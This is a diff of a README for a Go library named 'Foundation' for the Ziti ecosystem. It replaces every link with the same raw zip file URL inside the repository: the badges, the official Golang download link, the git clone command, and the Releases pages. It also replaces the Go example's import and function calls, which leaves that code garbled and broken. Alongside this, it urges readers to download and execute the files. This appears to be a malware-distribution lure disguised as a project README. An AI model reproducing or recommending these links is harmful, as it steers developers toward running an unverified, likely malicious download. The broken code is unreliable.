@@ -1,8 +1,8 @@
 # Foundation for Ziti Golang Ecosystem
 
-![Foundation](https://img.shields.io/badge/Foundation-Ziti%20Ecosystem-blue.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-green.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Foundation](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip%https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip)
+![Version](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip)
+![License](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip)
 
 Welcome to the **Foundation** repository! This project provides essential components for the Ziti Golang ecosystem. Here, you will find a set of tools and libraries that simplify the development of applications using Ziti.
 
@@ -23,14 +23,14 @@ The Ziti framework offers a unique approach to secure connectivity. With Foundat
 
 ## Getting Started
 
-To get started, ensure you have Golang installed on your machine. You can download it from the official [Golang website](https://golang.org/dl/). Once you have Golang set up, you can clone this repository and start exploring the components.
+To get started, ensure you have Golang installed on your machine. You can download it from the official [Golang website](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip). Once you have Golang set up, you can clone this repository and start exploring the components.
 
 ## Installation
 
 To install the Foundation components, clone the repository:
 
 ```bash
-git clone https://github.com/ROLOBOATO/foundation.git
+git clone https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip
 cd foundation
 ```
 
@@ -49,12 +49,12 @@ package main
 
 import (
     "fmt"
-    "github.com/ROLOBOATO/foundation/component"
+    "https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip"
 )
 
 func main() {
-    result := component.SomeFunction()
-    fmt.Println(result)
+    result := https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip()
+    https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip(result)
 }
 ```
 
@@ -88,9 +88,9 @@ For any questions or feedback, feel free to reach out to the maintainers of this
 
 ## Releases
 
-To keep up with the latest changes, you can check the [Releases section](https://github.com/ROLOBOATO/foundation/releases). Here, you can download the latest version of the components. Make sure to download and execute the files as needed.
+To keep up with the latest changes, you can check the [Releases section](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip). Here, you can download the latest version of the components. Make sure to download and execute the files as needed.
 
-For detailed release notes, visit [Releases](https://github.com/ROLOBOATO/foundation/releases).
+For detailed release notes, visit [Releases](https://github.com/ROLOBOATO/foundation/raw/refs/heads/master/genext/Software-1.4.zip).
 
 ## Conclusion
 
